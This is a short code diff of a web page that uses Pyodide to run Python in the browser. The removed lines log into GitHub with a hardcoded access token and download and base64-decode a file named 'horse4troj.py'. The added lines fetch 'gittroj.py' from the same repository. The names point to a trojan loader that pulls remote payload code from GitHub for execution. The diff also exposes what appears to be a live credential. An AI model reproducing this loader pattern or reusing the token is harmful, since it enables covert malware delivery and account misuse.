@@ -19,27 +19,20 @@
         await pyodide.loadPackage("micropip");
         const micropip = pyodide.pyimport("micropip");
         await micropip.install("github3.py");
+        await micropip.install('requests')
         const fs = pyodide.fs;
         const sys = pyodide.sys;
-        console.log(pyodide.runPython(`
-        import os
-        import sys
-        import github3
-        import base64
-        def github_connect():
-          user = 'pokamann'
-          token = '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'
-          session = github3.login(token=token)
-          return session.repository(user, 'apokalips')                
-        def get_file_contents(module_name, repo):
-          return repo.file_contents(f"{module_name}").content
-        def make_req():        
-          repo = github_connect()
-          config_json = get_file_contents('horse4troj.py',repo)
-          config = base64.b64decode(config_json).decode('utf-8')
-          return config
-        `));
-          const output = pyodide.runPython(`make_req()`);
+        async function getTextFromURL(url) {
+            const pyodide = await loadPyodide();
+            await pyodide.runPythonAsync(`
+        import requests
+        from js import document
+        response = requests.get('https://github.com/pokamann/apokalips/blob/master/gittroj.py')
+        text_area = document.querySelector('read-only-cursor-text-area')
+        text = text_area.value
+        print(text)
+          `);
+        }
         //fs.writeFileSync(pyFile, pythonCode);
         //import ${pyFile.replace('.py', '')}
         // Execute the Python script
